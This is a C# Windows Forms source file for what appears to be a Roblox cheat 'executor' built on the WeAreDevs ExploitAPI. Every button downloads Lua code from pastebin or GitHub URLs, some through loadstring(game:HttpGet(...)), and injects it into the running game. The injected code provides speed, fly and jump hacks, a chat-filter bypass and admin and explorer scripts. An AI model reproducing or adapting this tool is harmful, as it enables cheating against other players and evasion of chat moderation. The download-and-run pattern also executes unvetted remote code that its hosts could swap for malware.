using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ComponentFactory.Krypton.Toolkit;
using WeAreDevs_API;

namespace Tridle_Executor
{
    public partial class EasyMenu : KryptonForm
    {
        ExploitAPI module = new ExploitAPI();
        public EasyMenu()
        {
            InitializeComponent();
        }

        private void btn_SpeedHack_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/YUSMCRx2");
            module.SendLuaScript(Script);
        }

        private void btn_Jumpboost_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/4SWqkS4j");
            module.SendLuaScript(Script);
        }

        private void btn_Fly_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/9JuZt2Ga");
            module.SendLuaScript(Script);
        }

        private void btn_ChatBypass_Click(object sender, EventArgs e)
        {
            module.SendLuaScript("loadstring(game: HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()");
        }

        private void btn_InfiniteYield_Click(object sender, EventArgs e)
        {
            module.SendLuaScript("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()");
        }

        private void btn_DexExplorer_Click(object sender, EventArgs e)
        {
            WebClient wb = new WebClient();
            string Script = wb.DownloadString("https://pastebin.com/raw/eWq49YD3");
            module.SendLuaScript(Script);
        }
    }
}
